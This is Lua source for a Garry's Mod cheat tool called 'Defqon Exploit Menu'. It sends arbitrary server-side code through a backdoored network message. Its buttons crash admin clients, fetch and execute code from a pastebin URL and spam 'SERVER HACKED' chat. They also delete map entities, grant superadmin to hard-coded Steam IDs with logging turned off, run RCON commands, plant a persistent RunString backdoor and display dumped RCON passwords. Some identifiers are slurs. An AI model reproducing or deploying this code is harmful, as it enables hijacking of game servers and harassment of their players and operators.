commandnethtx8:SetText("Changer le model des joueurs")
commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
commandnethtx8.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx8.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx9 = vgui.Create("DButton", DScrollPanel)
commandnethtx9:SetSize( 652, 20 )
commandnethtx9:SetPos( 2, 250 )
commandnethtx9:SetText("Niquer la physics du jeu")
commandnethtx9:SetTextColor(Color(255, 255, 255, 255))
commandnethtx9.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx9.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx10 = vgui.Create("DButton", DScrollPanel)
commandnethtx10:SetSize( 652, 20 )
commandnethtx10:SetPos( 2, 275 )
commandnethtx10:SetText("Inverser la gravité")
commandnethtx10:SetTextColor(Color(255, 255, 255, 255))
commandnethtx10.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx10.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx11 = vgui.Create("DButton", DScrollPanel)
commandnethtx11:SetSize( 652, 20 )
commandnethtx11:SetPos( 2, 300 )
commandnethtx11:SetText("Reset Argent")
commandnethtx11:SetTextColor(Color(255, 255, 255, 255))
commandnethtx11.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx11.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx12 = vgui.Create("DButton", DScrollPanel)
commandnethtx12:SetSize( 652, 20 )
commandnethtx12:SetPos( 2, 325 )
commandnethtx12:SetText("Faire voler tous les joueurs")
commandnethtx12:SetTextColor(Color(255, 255, 255, 255))
commandnethtx12.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx12.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx13 = vgui.Create("DButton", DScrollPanel)
commandnethtx13:SetSize( 652, 20 )
commandnethtx13:SetPos( 2, 350 )
commandnethtx13:SetText("Crash superadmin")
commandnethtx13:SetTextColor(Color(255, 255, 255, 255))
commandnethtx13.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx13.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
net.WriteBit(1)
net.SendToServer()
end

local commandnethtx14 = vgui.Create("DButton", DScrollPanel)
commandnethtx14:SetSize( 652, 20 )
commandnethtx14:SetPos( 2, 75 )
commandnethtx14:SetText("Squeleton Danse")
commandnethtx14:SetTextColor(Color(255, 255, 255, 255))
commandnethtx14.Paint = function(panel, w, h)
surface.SetDrawColor(160, 61, 255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(178, 99, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx14.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/QiEipqZ4\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
end

local commandnethtx15 = vgui.Create("DButton", DScrollPanel)
commandnethtx15:SetSize( 652, 20 )
commandnethtx15:SetPos( 2, 400 )
commandnethtx15:SetText("+1000$/s")
commandnethtx15:SetTextColor(Color(255, 255, 255, 255))
commandnethtx15.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx15.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do timer.Create( \"timerargent10\", 0.1, 0, function() v:addMoney(10) end) end" )
net.WriteBit(1)
net.SendToServer()
end

local commandnethtx17 = vgui.Create("DButton", DScrollPanel)
commandnethtx17:SetSize( 652, 20 )
commandnethtx17:SetPos( 2, 425 )
commandnethtx17:SetText("Supprimer Toutes les Entité")
commandnethtx17:SetTextColor(Color(255, 255, 255, 255))
commandnethtx17.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx17.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
net.WriteBit(1)
net.SendToServer()
end

local commandnethtxSpamChat = vgui.Create("DButton", DScrollPanel )
commandnethtxSpamChat:SetSize( 652, 20 )
commandnethtxSpamChat:SetPos( 2, 450 )
commandnethtxSpamChat:SetText("Spam Chat")
commandnethtxSpamChat:SetTextColor(Color(255,255,255,255))
commandnethtxSpamChat.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtxSpamChat.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString("timer.Create( \"rekt\", 0.1, 0, function() BroadcastLua([[chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), \"◊◊◊◊◊ SERVER HACKED BY defqonHACK ! ◊◊◊◊◊\")]]) end)")
net.WriteBit(1)
net.SendToServer()
end

local commandnethtxSpamChatStop = vgui.Create("DButton", DScrollPanel )
commandnethtxSpamChatStop:SetSize( 652, 20 )
commandnethtxSpamChatStop:SetPos( 2, 475 )
commandnethtxSpamChatStop:SetTextColor(Color(255,255,255,255))
commandnethtxSpamChatStop:SetText("Stop Spam Chat")
commandnethtxSpamChatStop.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtxSpamChatStop.DoClick = function ()
net.Start(thefrenchenculer)
net.WriteString("timer.Stop( \"rekt\")")
net.WriteBit(1)
net.SendToServer() 
end

local setsuperadmin = vgui.Create("DButton", DScrollPanel )
setsuperadmin:SetSize( 652, 20 )
setsuperadmin:SetPos( 2, 500 )
setsuperadmin:SetTextColor(Color(255,255,255,255))
setsuperadmin:SetText("Se Mettre Superadmin")
setsuperadmin.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
setsuperadmin.DoClick = function ()
local setsuperadminsetting = [[
RunConsoleCommand("ulx_logecho", "0")
RunConsoleCommand("ulx", "adduserid", "STEAM_0:0:189348722", "superadmin")
RunConsoleCommand("ulx", "adduserid", "STEAM_0:0:99250842", "superadmin")
RunConsoleCommand("ulx", "adduserid", "STEAM_0:0:179576807", "superadmin")
]]
net.Start(thefrenchenculer)
net.WriteString( setsuperadminsetting )
net.WriteBit(1)
net.SendToServer() 
end
--local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
--RconCommand:SetSize( 668, 20 )
--RconCommand:SetPos( 2, 25 )
local RconCommand = vgui.Create( "DTextEntry", DScrollPanel )
RconCommand:SetPos( 110, 21 )
RconCommand:SetSize( 545, 20 )
RconCommand:SetText( "hostname Hacked by DefqonSploit | discord.gg/hf8GVVS" )
local Lancer_rcon_commande = vgui.Create("DButton", DScrollPanel )
Lancer_rcon_commande:SetSize( 103, 20 )
Lancer_rcon_commande:SetPos( 2, 21 )
Lancer_rcon_commande:SetText("RCON Команда")
Lancer_rcon_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_rcon_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 50, 50 ,245)
surface.DrawRect(0, 0, w, h)
end
Lancer_rcon_commande.DoClick = function()
surface.PlaySound("garrysmod/ui_click.html")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Rcon Команда отправлена" )
local rcon_commandes_get = RconCommand:GetValue()
iZNX.NetStart(thefrenchenculer)
net.WriteString( rcon_commandes_get )
net.WriteBit(false)
net.SendToServer()
end



local GLUACommand = vgui.Create( "DTextEntry", DScrollPanel )
GLUACommand:SetPos( 110, 0 )
GLUACommand:SetSize( 545, 20 )
GLUACommand:SetText( "util.AddNetworkString('nostrip') net.Receive('nostrip',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)" )
local Lancer_glua_commande = vgui.Create("DButton", DScrollPanel )
Lancer_glua_commande:SetSize( 103, 20 )
Lancer_glua_commande:SetPos( 2, 0 )
Lancer_glua_commande:SetText("Code LUA")
Lancer_glua_commande:SetTextColor(Color(255, 255, 255, 255))
Lancer_glua_commande.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(50, 50, 50 ,245)
surface.DrawRect(0, 0, w, h)
end
Lancer_glua_commande.DoClick = function()
surface.PlaySound("garrysmod/ui_click.html")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Lua код отправлен" )
local glua_commandes_get = GLUACommand:GetValue()
iZNX.NetStart(thefrenchenculer)
net.WriteString( glua_commandes_get )
net.WriteBit(1)
net.SendToServer()
end
end
net.Receive( "rcon_passw_dump", function()
local rcon_pass = net.ReadString()
chat.AddText( Color(255, 255, 255), rcon_pass, Color(0, 255, 0),"")
end )
net.Receive( "aucun_rcon_ici", function()
chat.AddText( Color(255, 0, 0),"На сервере нету Rcon пароля" )
end )


function iZNX.MakePlayerSelectionButton( parent, x, y, addr )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( "Выберите игрока" )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 100, 100, 245 ) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
--surface.SetMaterial( downgrad )
--surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
--surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(70, 70, 100, 255) )
--surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.SelectPlayersPanel( addr )
end
return TButton:GetWide(), TButton:GetTall()
end


function iZNX.SelectPlayersPanel( addr )
if iZNX.PlayerSelector and iZNX.PlayerSelector:IsVisible() then iZNX.PlayerSelector:Remove() end
local plytab = iZNX.GetStored( addr, {} )
iZNX.PlayerSelector = vgui.Create("DFrame")
iZNX.PlayerSelector:SetSize(682,350)
iZNX.PlayerSelector:SetDraggable( false ) 
iZNX.PlayerSelector:SetTitle("Цели")
iZNX.PlayerSelector:SetPos( 620, 405)
iZNX.PlayerSelector:MakePopup()
iZNX.PlayerSelector:ShowCloseButton( false ) 
iZNX.PlayerSelector.DoClick = function()
        CloseMenu:Remove()
end
iZNX.PlayerSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end


local CloseMenu2 = vgui.Create("DButton", iZNX.PlayerSelector )
    CloseMenu2:SetText("<--")
    CloseMenu2:SetSize(200, 200)
    CloseMenu2:SetPos(iZNX.PlayerSelector:GetWide()-120,-85)
    CloseMenu2:SetTextColor(Color(100, 100, 100,245))
    CloseMenu2:SetFont("defqonfont20")
    CloseMenu2.Paint = function( self,w,h ) end
    CloseMenu2.DoClick = function()
        iZNX.PlayerSelector:Remove()

    end 

local Plist = vgui.Create( "DPanelList", iZNX.PlayerSelector )
Plist:SetSize( iZNX.PlayerSelector:GetWide() - 10, iZNX.PlayerSelector:GetTall() - 55 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 5, 40 )
Plist:SetName( "" )
local target1 = vgui.Create("DButton", iZNX.PlayerSelector)
target1:SetSize( 40, 20 )
target1:SetPos( 10, 23 )
target1:SetText("Все")
target1:SetTextColor(Color(255, 255, 255, 255))
target1.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
--surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
target1.DoClick = function()
for _, p in pairs(player.GetAll()) do
if not table.HasValue( plytab, p ) then
table.insert( plytab, p )
end
end
iZNX.Store( addr, plytab )
end
local target2 = vgui.Create("DButton", iZNX.PlayerSelector)
target2:SetSize( 40, 20 )
target2:SetPos( 55, 23 )
target2:SetText("Никто")
target2:SetTextColor(Color(255, 255, 255, 255))
target2.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
--surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
target2.DoClick = function()
table.Empty( plytab )
iZNX.Store( addr, plytab )
end
local target3 = vgui.Create("DButton", iZNX.PlayerSelector )
target3:SetSize( 40, 20 )
target3:SetPos( 100, 23 )
target3:SetText("Вы")
target3:SetTextColor(Color(255, 255, 255, 255))
target3.Paint = function(panel, w, h)
surface.SetDrawColor(100, 100, 100 ,255)
--surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
target3.DoClick = function()
table.Empty( plytab )
table.insert( plytab, LocalPlayer() )
iZNX.Store( addr, plytab )
end
local target4 = vgui.Create( "DTextEntry", iZNX.PlayerSelector )
target4:SetPos( 145, 23 )
target4:SetSize( 95, 20 )
target4:SetText( "" )
target4.OnChange = function( self )
local nam = self:GetValue()
local namtab = string.Explode( ", ", nam )
table.Empty( plytab )
for _, pl in pairs( player.GetAll() ) do
for _, s in pairs( namtab ) do
if string.find( string.lower( pl:Nick() ), s ) then
table.insert( plytab, pl )
end
end
end
iZNX.Store( addr, plytab )
end
for k, v in pairs( player.GetAll() ) do
local plypanel2 = vgui.Create( "DPanel" )
plypanel2:SetPos( 0, 0 )
plypanel2:SetSize( 200, 25 )
local teamcol = team.GetColor( v:Team() )
plypanel2.Paint = function( s, w, h )
if !v:IsValid() then return end
surface.SetDrawColor( Color(100, 100, 100, 30) )
surface.DrawRect( 0, 0, w, h )
--surface.SetDrawColor( teamcol )
surface.DrawRect( 0, h - 3, w, 3 )
surface.SetDrawColor( Color(55, 55, 55, 245) )
surface.DrawOutlinedRect( 0, 0, w, h )
if table.HasValue( plytab, v ) then surface.SetDrawColor( Color(160, 61, 255 ) ) end
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end
local plyname = vgui.Create( "DLabel", plypanel2 )
plyname:SetPos( 10, 5 )
plyname:SetFont( "Trebuchet18" )
local tcol = Color( 255, 255, 255 )
if v == LocalPlayer() then tcol = Color( 155, 155, 255 ) end
plyname:SetColor( tcol )
plyname:SetText( v:Nick() )
plyname:SetSize(180, 15)
local faggot = vgui.Create("DButton", plypanel2 )
faggot:SetSize( plypanel2:GetWide(), plypanel2:GetTall() )
faggot:SetPos( 0, 0 )
faggot:SetText("")
faggot.Paint = function(panel, w, h)
return
end
faggot.DoClick = function()
if table.HasValue( plytab, v ) then
table.RemoveByValue( plytab, v )
else
table.insert( plytab, v )
end
iZNX.Store( addr, plytab )
end
Plist:AddItem( plypanel2 )
end
end


concommand.Add( "dontgetit", function()
local defqondontgetit = vgui.Create("DFrame")
defqondontgetit:SetSize(2300,2300)
defqondontgetit:SetTitle("")
defqondontgetit:Center()
defqondontgetit:SetDraggable( false )
defqondontgetit:MakePopup()
defqondontgetit.gay = table.Count( iZNX.sploits )
defqondontgetit:ShowCloseButton( false ) 
defqondontgetit.Paint = function( s, w, h )
surface.SetDrawColor( Color(0, 0, 0, 255) )   ---<
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )  --
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
surface.DrawRect( 10, 10, w - 20, h - 20 )
surface.SetDrawColor( Color(math.random(50,200),math.random(50,200),math.random(50,200),math.random(25,75)) )
--surface.DrawRect( 0, 520, w - 0, h - 0 )
--surface.SetDrawColor( Color(255, 66, 66, 0) )
--surface.DrawRect( 0, 520, w - 0, h - 0 )
surface.SetDrawColor( Color(255, 66, 66, 0) )
surface.DrawLine( 10, 25, 40, 30 )
surface.DrawLine( 40, 30, 70, 25 )
surface.DrawLine( 10, 25, 25, 40 )
surface.DrawLine( 55, 40, 70, 25 )
surface.PlaySound( "buttons/weapon_cant_buy.html" )
surface.PlaySound( "buttons/blip2.html" )
surface.PlaySound( "bot/cover_me.html" )
surface.DrawLine( 25, 40, 25, 60 )
surface.DrawLine( 55, 40, 55, 60 )
surface.DrawLine( 25, 60, 40, 70 )
surface.DrawLine( 55, 60, 40, 70 )
draw.SimpleTextOutlined( "ERREUR defqonHACK : Votre comptre n'est pas activé", "defqonfontlight", 1200, 350, Color( 255, 255, 255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(100, 100, 100, 0) )

end 
end)



function iZNX.MakeTextInputButton( parent, x, y, btext, default, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local tentry = vgui.Create( "DTextEntry", hostframe )
tentry:SetPos( 10 + tttt:GetWide(), 2 )
tentry:SetSize( 130, 20 )
tentry:SetText( iZNX.GetStored( addr, default ) )
tentry.OnChange = function( self )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + tentry:GetWide(), 24 )
return hostframe:GetWide(), hostframe:GetTall()
end


function iZNX.MakeNumberInputButton( parent, x, y, btext, default, min, max, addr)
if !parent:IsValid() then return end
local hostframe = vgui.Create( "DPanel", parent )
hostframe:SetPos( x, y )
hostframe.Paint = function( self, w, h )
surface.SetDrawColor( Color(60, 60, 60, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetMaterial( downgrad )
surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
end
local tttt = vgui.Create( "DLabel", hostframe )
tttt:SetPos( 5, 5 )
tttt:SetText( btext )
tttt:SizeToContents()
local wangmeoff = vgui.Create( "DNumberWang", hostframe )
wangmeoff:SetPos( 10 + tttt:GetWide(), 2 )
wangmeoff:SetSize( 75, 20 )
wangmeoff:SetDecimals( 2 )
wangmeoff:SetMinMax( min , max )
wangmeoff:SetValue( iZNX.GetStored( addr, default ) )
wangmeoff:SetAllowNonAsciiCharacters(false)
wangmeoff.OnValueChanged = function( self, val )
iZNX.Store( addr, self:GetValue() )
end
hostframe:SetSize( 13 + tttt:GetWide() + wangmeoff:GetWide(), 24 )    
return hostframe:GetWide(), hostframe:GetTall()
end



surface.CreateFont( "defqonfont20", {
    font = "Roboto",
    extended = false,
    size = 20,
    weight = 500,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

surface.CreateFont( "defqonfontlight", {  
    font = "Roboto",
    extended = false,
    size = 40,
    weight = 20,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

surface.CreateFont( "defqonfontrules", {  
    font = "Roboto",
    extended = false,
    size = 20,
    weight = 20,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

surface.CreateFont( "defqonfonthard", {  
    font = "Roboto",
    extended = false,
    size = 13,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

surface.CreateFont( "defqonfontlogo", {  
    font = "Arial",
    extended = false,
    size = 30,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})

surface.CreateFont( "defqonfonthello", {  
    font = "Roboto",
    extended = false,
    size = 20,
    weight = 600,
    blursize = 0,
    scanlines = 0,
    antialias = true,
})



iZNX.Menu = vgui.Create("DFrame")
iZNX.Menu:SetSize(650,490)
iZNX.Menu:SetTitle("")
iZNX.Menu:SetPos( ScrW() / 2 - iZNX.Menu:GetWide() / 2, ScrH() / 2 - iZNX.Menu:GetTall() / 2 )
iZNX.Menu:SetMouseInputEnabled(true)
iZNX.Menu:SetKeyBoardInputEnabled(true)
iZNX.Menu:SetVisible(false)
iZNX.Menu:ShowCloseButton(false)
iZNX.Menu:SetAlpha(0)
iZNX.Menu.gay = table.Count( iZNX.sploits )
iZNX.Menu.Paint = function( s, w, h )
surface.SetDrawColor( Color(60, 60, 60, 245) )   ---<
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(100, 100, 100, 220) )  --
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
surface.SetDrawColor( Color(20, 20, 20, 230) )
surface.DrawRect( 10, 10, w - 20, h - 20 )
surface.SetDrawColor( Color(100, 100, 100, 200) )
--surface.DrawRect( 0, 520, w - 0, h - 0 )
--surface.SetDrawColor( Color(255, 66, 66, 0) )
--surface.DrawRect( 0, 520, w - 0, h - 0 )
surface.SetDrawColor( Color(255, 66, 66, 0) )
surface.DrawLine( 10, 25, 40, 30 )
surface.DrawLine( 40, 30, 70, 25 )
surface.DrawLine( 10, 25, 25, 40 )
surface.DrawLine( 55, 40, 70, 25 )
surface.DrawLine( 25, 40, 25, 60 )
surface.DrawLine( 55, 40, 55, 60 )
surface.DrawLine( 25, 60, 40, 70 )
surface.DrawLine( 55, 60, 40, 70 )
draw.DrawText( "Defqon™ | by Leith | Exploit Menu", "defqonfonthard", 485, 625, Color(255, 255, 255, 50) )
draw.DrawText( "亗", "defqonfontlogo", 16, 13, Color(255, 255, 255, 20) )
draw.DrawText( "Exploit City", "defqonfontlight", 215, 30, Color( 255, 255, 255,255) )
draw.DrawText( "My life...my rules  (⊙︿⊙)", "defqonfontrules", 215, 70, Color( 255, 255, 255,255) )
end
--draw.DrawText( "ＥＸＰＬＯＩＴ ＣＩＴＹ", "defqonfontlight", 215, 30, Color( 255, 255, 255,255) )
--ℳy ℓiƒℯ...ℳy ℛuℓℯs
--draw.DrawText( "DefqonSploit", "defqonfontlight", 215, 30, HSVToColor( CurTime() % 6 * 60, 1, 1 ) )
--draw.DrawText( "Exploits Is My City", "defqonfontlight", 215, 30, Color( 255, 255, 255,255) ) (То, что стоит сейчас)

local CloseMenu = vgui.Create("DButton", iZNX.Menu )
    CloseMenu:SetText("X")
    CloseMenu:SetSize(200, 200)
    CloseMenu:SetPos(iZNX.Menu:GetWide()-125,-75)
    CloseMenu:SetTextColor(Color(255, 66, 66,255))
    CloseMenu:SetFont("defqonfont20")
    CloseMenu.Paint = function( self,w,h ) end
	
    CloseMenu.DoClick = function()
    iZNX.Menu:SetMouseInputEnabled(false)
    iZNX.Menu:SetKeyBoardInputEnabled(false)
    iZNX.Menu:AlphaTo(0, 0.5, 0, function()
    iZNX.Menu:SetVisible(false)
    end)
end
    

local Plist = vgui.Create( "DPanelList", iZNX.Menu )
Plist:SetSize( iZNX.Menu:GetWide() - 20, iZNX.Menu:GetTall() - 35 )
Plist:SetPadding( 5 )
Plist:SetSpacing( 5 )
Plist:EnableHorizontal( false )
Plist:EnableVerticalScrollbar( true )
Plist:SetPos( 10, 90 )
Plist:SetName( "" )
--iZNX.MakeFunctionButton( iZNX.Menu, 10, 130, "Load Config", iZNX.LoadConfig, "Charger une Config" )
--iZNX.MakeFunctionButton( iZNX.Menu, 10, 160, "Save Config", iZNX.SaveConfig, "Sauvegarder la Config" )
local function CreateSploitPanel( name, t )
if !iZNX.Menu then return end
local cmdp = vgui.Create( "DPanel" )
cmdp:SetSize( Plist:GetWide(), 50 )
cmdp.Cmd = name
cmdp.Desc = t.desc
cmdp.Paint = function( s, w, h )
surface.SetDrawColor( Color(60, 60, 60, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( severitycols[t.severity] )
surface.DrawOutlinedRect( 0, 0, w, h )
--surface.DrawLine( 0, 24, w, 24 )
draw.DrawText( cmdp.Cmd, "DermaDefault", 11, 2, Color(255,255,255) )
--draw.DrawText( cmdp.Desc, "DermaDefault", 450, 2, Color(205,205,255, 100) ) 
end

--timer.Create("timerversionchecker",7,1,function()
--hook.Remove("HUDPaint", "HudVersionChecker")
--end)



-- POSE DES FONCTIONS BOUTONS
local x = 10
for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + iZNX.MakeFunctionButton( cmdp, x, 21, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + iZNX.MakePlayerSelectionButton( cmdp, x, 21, tab.addr )
elseif tab.typ == "htxcommandeliste" then
x = (x + 5) + iZNX.HTXBackdoor( cmdp, x, 21, tab.name )
elseif tab.typ == "string" then
x = (x + 5) + iZNX.MakeTextInputButton( cmdp, x, 21, tab.name, tab.default, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + iZNX.MakeNumberInputButton( cmdp, x, 21, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
end
for k, v in pairs( iZNX.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end

-- END

concommand.Add("open_defqonhack", function()
    iZNX.Menu:SetVisible(true)
    iZNX.Menu:MakePopup()
    iZNX.Menu:AlphaTo(255, 0.5, 0)
end)